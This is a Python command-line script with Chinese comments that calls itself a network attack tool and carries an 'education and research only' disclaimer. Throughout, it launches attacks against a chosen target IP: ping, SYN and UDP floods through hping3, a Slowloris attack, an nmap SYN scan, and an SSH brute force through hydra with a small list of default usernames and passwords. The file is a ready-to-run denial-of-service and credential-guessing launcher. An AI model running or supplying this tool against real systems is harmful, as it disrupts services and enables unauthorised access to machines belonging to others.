#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用于发起各种网络攻击的工具脚本
注意：此脚本仅用于教育和研究目的，请勿用于非法活动
"""

import os
import sys
import time
import argparse
import subprocess
from datetime import datetime

def parse_args():
    parser = argparse.ArgumentParser(description='网络攻击工具')
    parser.add_argument('-t', '--target', required=True, help='目标IP地址')
    parser.add_argument('-a', '--attack', required=True, 
                        choices=['ping', 'syn', 'udp', 'slowloris', 'scan', 'brute'], 
                        help='攻击类型')
    parser.add_argument('-p', '--port', type=int, default=80, help='目标端口（默认：80）')
    parser.add_argument('-d', '--duration', type=int, default=30, help='攻击持续时间（秒）')
    parser.add_argument('-i', '--interface', help='用于监控的网络接口')
    
    return parser.parse_args()

def run_command(cmd, shell=False):
    """运行命令并返回输出"""
    try:
        if shell:
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        else:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        stdout, stderr = process.communicate()
        return stdout.decode('utf-8'), stderr.decode('utf-8'), process.returncode
    except Exception as e:
        print(f"运行命令时出错: {str(e)}")
        return None, str(e), -1

def check_target(target_ip):
    """检查目标是否可达"""
    print(f"检查目标 {target_ip} 是否可达...")
    stdout, stderr, returncode = run_command(['ping', '-c', '1', '-W', '1', target_ip])
    
    if returncode == 0:
        print(f"目标 {target_ip} 可达")
        return True
    else:
        print(f"目标 {target_ip} 不可达")
        return False

def ping_flood(target_ip, duration):
    """ICMP Ping洪水攻击"""
    print(f"开始对 {target_ip} 进行Ping洪水攻击, 持续 {duration} 秒...")
    
    cmd = f"ping -f {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    
    # 等待指定的持续时间后终止攻击
    time.sleep(duration)
    process.terminate()
    
    print("Ping洪水攻击已完成")

def syn_flood(target_ip, target_port, duration):
    """SYN洪水攻击（需要Kali Linux中的hping3工具）"""
    print(f"开始对 {target_ip}:{target_port} 进行SYN洪水攻击, 持续 {duration} 秒...")
    
    cmd = f"hping3 -S --flood -p {target_port} {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    
    # 等待指定的持续时间后终止攻击
    time.sleep(duration)
    process.terminate()
    
    print("SYN洪水攻击已完成")

def udp_flood(target_ip, target_port, duration):
    """UDP洪水攻击（需要Kali Linux中的hping3工具）"""
    print(f"开始对 {target_ip}:{target_port} 进行UDP洪水攻击, 持续 {duration} 秒...")
    
    cmd = f"hping3 --udp --flood -p {target_port} {target_ip}"
    process = subprocess.Popen(cmd, shell=True)
    
    # 等待指定的持续时间后终止攻击
    time.sleep(duration)
    process.terminate()
    
    print("UDP洪水攻击已完成")

def slowloris_attack(target_ip, target_port, duration):
    """Slowloris攻击（需要安装slowloris工具）"""
    print(f"开始对 {target_ip}:{target_port} 进行Slowloris攻击, 持续 {duration} 秒...")
    
    cmd = f"slowloris {target_ip} -p {target_port} -s 500"
    process = subprocess.Popen(cmd, shell=True)
    
    # 等待指定的持续时间后终止攻击
    time.sleep(duration)
    process.terminate()
    
    print("Slowloris攻击已完成")

def port_scan(target_ip):
    """端口扫描攻击（使用nmap）"""
    print(f"开始对 {target_ip} 进行端口扫描...")
    
    cmd = ["nmap", "-sS", "-p", "1-1000", target_ip]
    stdout, stderr, returncode = run_command(cmd)
    
    if returncode == 0:
        print("端口扫描完成，结果如下:")
        print(stdout)
    else:
        print(f"端口扫描出错: {stderr}")

def brute_force(target_ip, target_port):
    """暴力破解攻击（使用hydra，示例针对SSH服务）"""
    if target_port == 80:
        target_port = 22  # 使用SSH作为默认暴力破解目标
    
    print(f"开始对 {target_ip}:{target_port} 进行暴力破解攻击...")
    
    # 创建一个简单的用户名和密码列表
    with open('/tmp/users.txt', 'w') as f:
        f.write('root\nadmin\nuser\n')
    
    with open('/tmp/pass.txt', 'w') as f:
        f.write('password\n123456\nadmin\nroot\n')
    
    cmd = ["hydra", "-L", "/tmp/users.txt", "-P", "/tmp/pass.txt", f"{target_ip}", "ssh", "-t", "4"]
    stdout, stderr, returncode = run_command(cmd)
    
    print("暴力破解攻击完成，结果如下:")
    print(stdout)
    
    # 清理临时文件
    os.remove('/tmp/users.txt')
    os.remove('/tmp/pass.txt')

def main():
    args = parse_args()
    
    print("=" * 50)
    print("网络攻击工具 - 仅用于教育和研究目的")
    print("=" * 50)
    
    # 检查目标是否可达
    if not check_target(args.target):
        print("目标不可达，退出...")
        sys.exit(1)
    
    # 根据指定的攻击类型发起攻击
    if args.attack == 'ping':
        ping_flood(args.target, args.duration)
    elif args.attack == 'syn':
        syn_flood(args.target, args.port, args.duration)
    elif args.attack == 'udp':
        udp_flood(args.target, args.port, args.duration)
    elif args.attack == 'slowloris':
        slowloris_attack(args.target, args.port, args.duration)
    elif args.attack == 'scan':
        port_scan(args.target)
    elif args.attack == 'brute':
        brute_force(args.target, args.port)
    
    print("攻击已完成")

if __name__ == "__main__":
    main() 